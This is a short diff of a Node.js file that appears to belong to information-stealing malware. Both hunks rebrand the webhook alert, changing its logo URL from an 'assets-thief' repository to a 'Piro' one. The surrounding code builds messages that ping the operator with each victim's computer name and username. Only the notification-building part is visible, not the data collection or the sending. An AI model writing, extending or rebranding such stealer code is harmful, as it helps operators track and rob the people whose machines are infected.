@@ -1643,13 +1643,13 @@ const https = require("https"),
           ],
 
           thumbnail: {
-            url: `https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png`,
+            url: `https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png`,
           },
         };
         const message = {
           username: "Piro Sentinel",
           avatar_url:
-            "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+            "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
           content:
             "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
           embeds: [embed],
@@ -1707,13 +1707,13 @@ const https = require("https"),
               ],
     
               thumbnail: {
-                url: `https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png`,
+                url: `https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png`,
               },
             };
             const message = {
               username: "Piro Sentinel",
               avatar_url:
-                "https://raw.githubusercontent.com/freeman649/assets-thief/main/logo/image_3.png",
+                "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
               content:
                 "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
               embeds: [embed],
